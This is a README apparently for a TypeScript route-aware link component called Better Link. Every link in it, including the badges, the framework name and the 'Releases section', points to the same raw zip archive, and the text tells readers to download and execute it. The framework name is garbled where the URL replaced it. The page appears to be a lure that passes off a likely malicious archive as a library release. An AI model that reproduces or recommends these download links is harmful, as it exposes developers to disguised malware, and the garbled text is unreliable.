# Better Link 🌐

![GitHub release](https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip) ![npm](https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip) ![GitHub issues](https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip)

Welcome to **Better Link**, a lightweight and powerful enhancement for https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip Link components. This library automatically detects active routes and provides intuitive APIs for handling active states, all with complete TypeScript support. 

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [API](#api)
- [Contributing](#contributing)
- [License](#license)
- [Links](#links)

## Features ✨

- **Automatic Active Route Detection**: Simplifies route management by automatically determining which links are active.
- **Intuitive APIs**: Provides easy-to-use methods for handling active states.
- **TypeScript Support**: Fully supports TypeScript, ensuring type safety and reducing runtime errors.
- **Lightweight**: Minimal footprint, keeping your application fast and efficient.
- **Open Source**: Contribute and improve the library with the community.

## Installation 📦

To install Better Link, run the following command:

```bash
npm install better-link
```

or

```bash
yarn add better-link
```

## Usage 🛠️

Using Better Link is straightforward. Here’s a quick example:

```javascript
import { BetterLink } from 'better-link';

const Navigation = () => {
  return (
    <nav>
      <BetterLink href="/" activeClassName="active">
        Home
      </BetterLink>
      <BetterLink href="/about" activeClassName="active">
        About
      </BetterLink>
    </nav>
  );
};
```

In this example, the `activeClassName` prop will apply the class "active" to the link that matches the current route.

## API 📜

### BetterLink Props

| Prop             | Type                | Description                                          |
|------------------|---------------------|------------------------------------------------------|
| `href`           | string              | The URL to link to.                                 |
| `activeClassName`| string              | Class name to apply when the link is active.        |
| `children`       | ReactNode           | Content to display inside the link.                  |

### Example

Here’s how to use the `activeClassName` prop:

```javascript
<BetterLink href="/contact" activeClassName="active">
  Contact Us
</BetterLink>
```

## Contributing 🤝

We welcome contributions to Better Link! If you want to help improve the library, follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes.
4. Test your changes.
5. Submit a pull request.

Please ensure your code follows the existing style and includes tests where applicable.

## License 📄

Better Link is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.

## Links 🔗

For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip). Here, you can download and execute the latest version of Better Link.

Check the [Releases section](https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip) for updates and new features.

---

Thank you for checking out Better Link! We hope you find it useful for your https://raw.githubusercontent.com/PedroFake02/better-link/main/src/better-link-v2.6.zip projects. Happy coding!